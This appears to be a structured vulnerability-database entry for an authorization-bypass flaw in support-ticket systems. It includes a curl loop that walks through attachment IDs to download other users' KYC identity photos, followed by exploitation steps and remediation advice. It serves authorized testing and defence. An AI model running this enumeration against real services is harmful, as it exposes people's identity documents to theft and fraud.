---
title: Unauthorized support-ticket attachment downloads (identity photos / KYC documents)
cve: None (business logic)
severity: high
cvss: 8.2
product: Custom support-ticket system
versions: Any
ports: 80, 443
keywords: ticket, attachment, authorization bypass, identity documents, kyc, download
entry: /api/support/attachment?fileId=
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
GET /api/support/ticket/{id}
GET /api/support/attachment?id=123
GET /upload/kyc/2026/xx.jpg
```

## Prerequisites

- An ordinary member account (able to submit tickets/upload attachments).

## PoC

```bash
# 1) Submit a ticket with an attachment and obtain your own fileId
curl -s -X POST https://target/api/support/ticket -H "Authorization: Bearer <t>" \
  -F 'title=test' -F 'file=@/tmp/a.jpg'
# Record the attachment id/url from the response

# 2) Change fileId to neighboring values (try both auto-increment and timestamp naming)
for i in 1001 1002 1003 1004; do
  code=$(curl -s -o /tmp/x.jpg -w '%{http_code}' "https://target/api/support/attachment?id=$i" -H "Authorization: Bearer <t>")
  echo "$i $code $(stat -c%s /tmp/x.jpg)"; file /tmp/x.jpg
done
# Confirmation: 200 with another user's image (jpg/png header)
```

## Exploitation Steps

1. First determine whether attachment URLs use IDs or paths (try directory traversal for path-based URLs);
2. Enumerate a small range (10 items) to confirm the authorization bypass; do not bulk-download identity documents;
3. Success means "bulk personal-information disclosure"; describe only counts and types in the report;
4. Evidence: HTTP headers + file type for one other user's attachment, with contents redacted.

## Remediation and Mitigation

- Verify attachment ownership on download (ticket.user_id = token.uid or a support role);
- Use non-enumerable random IDs; provide short-lived signed attachment URLs.

## References

- OWASP API1 BOLA; CWE-639.
